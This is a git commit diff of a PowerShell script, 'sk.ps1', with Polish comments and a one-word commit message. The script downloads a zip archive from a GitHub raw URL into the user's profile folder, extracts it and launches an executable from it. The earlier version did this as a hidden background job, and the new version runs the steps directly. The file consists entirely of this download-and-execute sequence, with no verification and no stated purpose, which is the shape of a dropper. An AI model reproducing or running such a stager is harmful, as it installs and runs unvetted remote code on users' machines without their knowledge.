c0a095b92081fc2b4a2f1f939e8bee527e2e70dd
Your Name <you@example.com>
2024-06-12 16:52:37 +0200

    ff

--- sk.ps1
+++ sk.ps1
@@ -1,15 +1,8 @@
-# Fragment kodu do uruchomienia jako osobny proces
-$scriptBlock = {
-    $fileUrl = "https://github.com/numeryczne/numeryczne/raw/main/plik.zip"
-    $destinationPath = "$env:USERPROFILE\plik.zip"
-    Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
+$fileUrl = "https://github.com/numeryczne/numeryczne/raw/main/plik.zip"
+$destinationPath = "$env:USERPROFILE\plik.zip"
+Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
 
-    cd "$env:USERPROFILE"
-    Add-Type -A 'System.IO.Compression.FileSystem'
-    [IO.Compression.ZipFile]::ExtractToDirectory('.\plik.zip', '.')
-    $exePath = ".\Debug\aplikacja1.exe"
-    Start-Process -FilePath $exePath
-}
-
-# Uruchomienie skryptu jako osobny proces
-Start-Job -ScriptBlock $scriptBlock
+cd "$env:USERPROFILE"
+Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('.\plik.zip', '.');
+$exePath = ".\Debug\aplikacja1.exe"
+Start-Process -FilePath $exePath
